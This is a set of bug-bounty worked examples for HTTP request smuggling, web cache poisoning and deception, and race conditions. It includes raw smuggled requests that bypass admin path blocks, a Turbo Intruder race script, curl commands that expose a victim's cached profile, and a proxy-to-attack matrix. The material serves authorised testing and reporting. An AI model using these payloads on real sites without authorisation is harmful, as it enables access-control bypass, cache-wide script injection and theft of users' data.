# HTTP Desync & Cache Attack — Worked Examples

> Referenced from [http-desync SKILL.md](../SKILL.md). Concrete request→response→conclusion examples for protocol-level testing.

## Table of Contents

- [Worked Example 1: CL.TE Request Smuggling Detection](#worked-example-1-clte-request-smuggling-detection)
- [Worked Example 2: CL.TE Exploitation — Admin Panel Access](#worked-example-2-clte-exploitation--admin-panel-access)
- [Worked Example 3: Web Cache Poisoning via X-Forwarded-Host](#worked-example-3-web-cache-poisoning-via-x-forwarded-host)
- [Worked Example 4: Web Cache Deception — PII Exfiltration](#worked-example-4-web-cache-deception--pii-exfiltration)
- [Worked Example 5: Race Condition — Coupon Double-Spend](#worked-example-5-race-condition--coupon-double-spend)
- [Worked Example 6: H2.CL Smuggling via HTTP/2 Downgrade](#worked-example-6-h2cl-smuggling-via-http2-downgrade)
- [Worked Example 7: CL.0 Server-Side Desync](#worked-example-7-cl0-server-side-desync)
- [Proxy Detection and Fingerprinting](#proxy-detection-and-fingerprinting)
- [Tool Commands Reference](#tool-commands-reference)

---

## Worked Example 1: CL.TE Request Smuggling Detection

**Scenario:** Target uses nginx as reverse proxy → Gunicorn/Django back-end. You suspect CL.TE because nginx prefers Content-Length and many Python back-ends prefer Transfer-Encoding.

### Step 1: Time-Based Detection (Safe)

Send a request where CL says the body is short, but TE chunked body includes trailing bytes. Use raw socket or Burp Repeater with "Update Content-Length" OFF:

```http
POST / HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

**How it works:** `CL: 6` tells the front-end (nginx) the body is `0\r\n\r\nX`. Front-end forwards all 6 bytes. Back-end uses TE chunked, reads `0\r\n\r\n` as end of body. The trailing `X` stays in the buffer as the start of the NEXT request — back-end tries to parse `XGET / HTTP/1.1...` and fails.

**Vulnerable:** First request `200 OK`, follow-up on same connection **times out** or `400 Bad Request`.
**Not vulnerable:** Both requests `200 OK` (no desync).

### Step 2: Differential Confirmation

Send the inverse (TE.CL test) — should NOT desync on a CL.TE target:

```http
POST / HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Transfer-Encoding: chunked

0

POST /404check HTTP/1.1
X: x
```

Normal response = confirmed CL.TE: front-end uses CL, back-end uses TE. **Do not proceed to exploitation without confirming program scope allows infrastructure-level testing.**

---

## Worked Example 2: CL.TE Exploitation — Admin Panel Access

**Scenario:** You confirmed CL.TE desync on `target.example.com`. The front-end blocks `/admin` paths. The back-end has no such restriction.

### Smuggled Request

```http
POST / HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 60
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.example.com
X: x

```

**What happens:** Front-end sees `POST /` (allowed) with CL: 60, forwards all bytes. Back-end uses TE chunked — reads `0\r\n\r\n` as end of first request. Remaining bytes (`GET /admin...`) sit in the buffer and prepend the next request on the connection. Back-end processes `GET /admin` directly — bypassing front-end path restriction.

**Evidence for report:** Screenshot of admin panel HTML from smuggled request + proof that direct `GET /admin` returns `403 Forbidden` + timestamp correlation.

**Severity:** Critical — full front-end access control bypass. CVSS v3.1: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N (10.0)

---

## Worked Example 3: Web Cache Poisoning via X-Forwarded-Host

**Scenario:** Target uses Cloudflare CDN → Express.js origin. The origin reflects `X-Forwarded-Host` in page links and script sources but the CDN doesn't include it in the cache key.

### Step 1: Identify Unkeyed Input

```
curl -s -H "X-Forwarded-Host: canary123.example.com" \
  "https://target.example.com/login?cachebuster=abc123" \
  -D -
```

**Response:**

```http
HTTP/2 200
cf-cache-status: MISS
content-type: text/html

<html>
<script src="https://canary123.example.com/static/app.js"></script>
<link rel="canonical" href="https://canary123.example.com/login">
```

**Key observation:** `canary123.example.com` reflected in `<script src>`. `cf-cache-status: MISS` means the origin processed it.

### Step 2: Confirm Cache Stores the Poisoned Response

Re-request **without** X-Forwarded-Host: `curl -s "https://target.example.com/login?cachebuster=abc123" -D -`

If response shows `cf-cache-status: HIT` with `canary123.example.com` still in the HTML — the poisoned response is cached. Any user requesting this cache key gets attacker-controlled JavaScript. Repeat without cachebuster to check production impact.

### Step 3: Clean Up

`curl -s "https://target.example.com/login" -D - | grep "canary123"` — if results, production cache is poisoned. Report immediately and request cache purge.

**Evidence:** (1) Reflection on MISS, (2) Poisoned content on HIT, (3) Same result from different IP/browser.

**Severity:** Critical — stored XSS affecting all visitors. CVSS: AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N

**FP check:** `cf-cache-status: DYNAMIC` or `Cache-Control: no-store`/`private` = no shared caching = no cache poisoning. Note: `no-cache` still allows storage (revalidation only); only `no-store` prevents caching.

---

## Worked Example 4: Web Cache Deception — PII Exfiltration

**Scenario:** Target uses a CDN that caches responses based on file extension. The origin serves user profile data on `/account/profile` regardless of the path suffix.

### Step 1: Check Path Extension Handling

```
curl -s "https://target.example.com/account/profile/x.css" \
  -H "Cookie: session=VICTIM_SESSION_TOKEN" -D -
```

**Response:**

```http
HTTP/2 200
cf-cache-status: MISS
content-type: text/html
cache-control: public, max-age=3600

<html>
<h1>Welcome, John Doe</h1>
<p>Email: john.doe@company.com</p>
<p>Phone: +1-555-0123</p>
<p>SSN: ***-**-1234</p>
```

**Key observation:** The origin serves the private profile page for `/account/profile/x.css` (it ignores the `/x.css` suffix). The CDN sees `.css` extension and caches it.

### Step 2: Access Cached Private Data (Attacker Perspective)

After the victim visits the crafted URL (sent via phishing, social engineering):

```
curl -s "https://target.example.com/account/profile/x.css" -D -
```

**Response (no auth cookie):**

```http
HTTP/2 200
cf-cache-status: HIT
age: 45

<html>
<h1>Welcome, John Doe</h1>
<p>Email: john.doe@company.com</p>
<p>Phone: +1-555-0123</p>
```

**Conclusion:** Victim's private data served from cache without authentication.

**Evidence for report:**
1. URL path with static extension returns private page content
2. Response cached by CDN (cf-cache-status: HIT)
3. Second request without auth returns same private data
4. Use TWO different sessions/IPs to prove cross-user access

**Severity:** Medium — CVSS v3.1 6.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N); programs often rate higher when cached PII is exposed cross-user

**Variants to test:** `/x.css`, `/x.js`, `/x.png` (standard cached extensions); `%2Fx.css` (encoded slash — CDN decodes, origin doesn't); `;x.css` (path parameter — CDN sees extension, origin ignores); `/x.avif` (newer format, aggressive caching).

---

## Worked Example 5: Race Condition — Coupon Double-Spend

**Scenario:** E-commerce target has single-use coupon code `SAVE50`. You want to test if applying it concurrently allows double-spend.

### Step 1: Prepare the Race

Use **single-packet attack** (HTTP/2) or **last-byte sync** (HTTP/1.1). Turbo Intruder is the standard tool:

```python
# Turbo Intruder — single-packet attack (all requests in one TCP packet)
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')  # Release all at once

def handleResponse(req, interesting):
    table.add(req)
```

Set the base request to `POST /api/cart/apply-coupon` with `{"coupon":"SAVE50"}`. For quick CLI testing (lower precision): `seq 1 20 | xargs -P 20 -I {} curl -s -X POST ... -d '{"coupon":"SAVE50"}' &`

### Step 2: Analyze Responses

**Vulnerable response (both succeed):**

```json
// Response 1 (stream 1):
{"status": "success", "discount": "$50.00", "message": "Coupon applied"}

// Response 2 (stream 2):
{"status": "success", "discount": "$50.00", "message": "Coupon applied"}

// Responses 3-10:
{"status": "error", "message": "Coupon already used"}
```

**Vulnerable:** Two+ `"success"` out of 20 attempts = race confirmed. Server checked validity before marking used; concurrent requests passed the check.
**Not vulnerable:** Only one `"success"`, rest get `"Coupon already used"` = proper serialization.

### Step 3: Prove Business Impact

**Evidence:** (1) Two concurrent successful coupon applications (timestamps), (2) Cart showing double discount ($100 instead of $50), (3) Sequential attempt only allows single application.

**Severity:** High — financial impact (doubled discounts). Medium if discount is trivial.

---

## Worked Example 6: H2.CL Smuggling via HTTP/2 Downgrade

**Scenario:** Target's CDN speaks HTTP/2 to clients but downgrades to HTTP/1.1 when talking to the origin. The CDN doesn't strip injected `Content-Length` headers from HTTP/2 requests.

### Step 1: Test H2 → H1 Downgrade

First, confirm the setup:

```bash
curl -v --http2 "https://target.example.com/" 2>&1 | grep -i "< server\|< via\|ALPN"
```

If you see `ALPN: h2` in the TLS negotiation but `Via: 1.1` in the response headers, the CDN is downgrading.

### Step 2: Inject Content-Length

Using a tool that allows raw HTTP/2 header manipulation (e.g., h2cSmuggler, Burp with HTTP/2 support):

```
# HTTP/2 pseudo-headers
:method: POST
:path: /
:authority: target.example.com

# Standard headers
content-type: application/x-www-form-urlencoded
content-length: 0

# Body (sent as DATA frame):
GET /admin HTTP/1.1
Host: target.example.com


```

**What happens:**
1. HTTP/2 request arrives at CDN with `content-length: 0` header AND a body (DATA frame)
2. CDN downgrades to HTTP/1.1, forwards both the CL header and the body
3. Origin reads `Content-Length: 0`, processes zero-length body, and treats `GET /admin...` as the next request on the connection
4. `GET /admin` is processed by the origin without front-end access controls

**Key insight:** HTTP/2 doesn't use Content-Length for framing (DATA frames are self-delimiting). But when the CDN converts to HTTP/1.1, the CL header becomes meaningful and creates a desync.

**Detection:** Send a normal follow-up request on the same H2 connection. If it times out or returns unexpected content (admin panel HTML), the smuggled request was processed. The smuggled response may also be served to other users' requests on the shared back-end connection.

---

## Worked Example 7: CL.0 Server-Side Desync

**Scenario:** You find that the target's `/health` endpoint doesn't read the request body. Any body sent is left in the connection buffer for the next request.

### Step 1: Identify CL.0 Endpoint

```
curl -s -X POST "https://target.example.com/health" \
  -H "Content-Length: 50" \
  -d 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' \
  -D -
```

**Note:** curl overrides CL with actual body size — use raw sockets or Burp Repeater with "Update Content-Length" disabled for precise CL control.

Server responds `200 OK` `{"status": "healthy"}` and ignores the body. On a keep-alive connection, those bytes sit in the buffer.

### Step 2: Exploit via Connection Reuse

Send a POST to `/health` with a body that contains a smuggled request, on a keep-alive connection:

```http
POST /health HTTP/1.1
Host: target.example.com
Content-Length: 70
Connection: keep-alive

GET /api/admin/users HTTP/1.1
Host: target.example.com
Cookie: x

```

**What happens:**
1. Server processes `POST /health` → returns `{"status":"healthy"}`
2. Server ignores the body (CL.0 behavior)
3. The body bytes (`GET /api/admin/users...`) stay in the buffer
4. Next request on this connection is prepended/replaced with the smuggled request
5. Server processes `GET /api/admin/users` with whatever cookies the NEXT user sends

**Where to find CL.0 endpoints:**
- `/health`, `/healthz`, `/ping`, `/ready`, `/status`
- Static file endpoints (`.js`, `.css`, `.png`)
- Endpoints that return early without reading body
- 301/302 redirect endpoints (redirect before body processing)

---

## Proxy Detection and Fingerprinting

Before testing, identify the proxy stack. Each component introduces specific desync opportunities.

### Quick Fingerprinting Commands

```bash
# CDN/proxy headers + HTTP/2 check
curl -s -D - "https://target.example.com/" | grep -iE "server:|via:|x-cache|cf-|x-amz|x-varnish|x-fastly"
curl -v --http2 "https://target.example.com/" 2>&1 | grep ALPN
# TE handling + unkeyed header reflection
curl -s -H "Transfer-Encoding: chunked" -H "Transfer-Encoding: x" "https://target.example.com/" -D -
curl -s -H "X-Forwarded-Host: canary.test" "https://target.example.com/" | grep "canary"
```

### Fingerprint-to-Attack Matrix

| You See | Proxy Likely | Primary Attack |
|---------|-------------|----------------|
| `cf-cache-status`, `cf-ray` | Cloudflare | Cache poisoning (unkeyed headers), cache deception |
| `x-amz-cf-id` | CloudFront | Query param cache poisoning, origin header injection |
| `x-varnish`, `Age` | Varnish | VCL bypass, cache poisoning via Vary |
| `server: nginx` + `via:` | Nginx reverse proxy | CL.TE, TE obfuscation, path normalization desync |
| `server: AkamaiGHost` | Akamai | Pragma debug headers, edge-side cache poisoning |
| `x-served-by: cache-` | Fastly | Surrogate-Control abuse, edge compute bypass |
| `server: envoy` | Envoy/Istio | Path normalization (%2F), H2 downgrade smuggling |
| `via: 1.1 haproxy` | HAProxy | Tunnel mode CL.0, strict parsing edge cases |
| H2 ALPN + `via: 1.1` | H2→H1 downgrade | H2.CL, H2.TE header injection |

---

## Tool Commands Reference

| Tool | Command / Location |
|------|--------------------|
| **Burp Repeater** (smuggling) | Uncheck "Update Content-Length" → send raw bytes; toggle HTTP/2 mode for H2 testing |
| **Turbo Intruder** (races) | `race-single-packet-attack.py` — see Example 5 for script |
| **Param Miner** (cache keys) | Right-click → "Guess headers" |
| **HTTP Request Smuggler** | "Launch smuggle probe" |
| **smuggler** (CLI) | `python3 smuggler.py -u https://target.example.com/` |
| **h2csmuggler** (h2c upgrade only) | `python3 h2csmuggler.py -x https://target.example.com/ --test` |
| **WCVS** (cache vuln scanner) | `wcvs -u https://target.example.com/ -sh "X-Forwarded-Host: canary.test"` |

---

## False Positive Checklist

Before reporting, verify your finding isn't a false positive:

| What You See | Check This | It's a FP If |
|---|---|---|
| Timeout on follow-up request | Retry 5+ times for consistency | Timeout is intermittent (network issue, not desync) |
| Different response for CL vs TE | Confirm with differential test (Step 2 above) | Both CL.TE and TE.CL tests show desync (likely testing error) |
| Header reflected in cached response | Remove header, re-request | Response WITHOUT header also reflects it (template default) |
| Two successful race responses | Check actual state (DB, cart, balance) | Second "success" response has empty/error body (soft-200) |
| Admin page via smuggling | Verify content is actual admin data | Generic 200 page / login redirect / empty body |
| Cache HIT on private page | Check Cache-Control headers | `Cache-Control: no-store` or `private` means origin intends no shared caching — but CDN may ignore these; verify with `cf-cache-status` or equivalent |
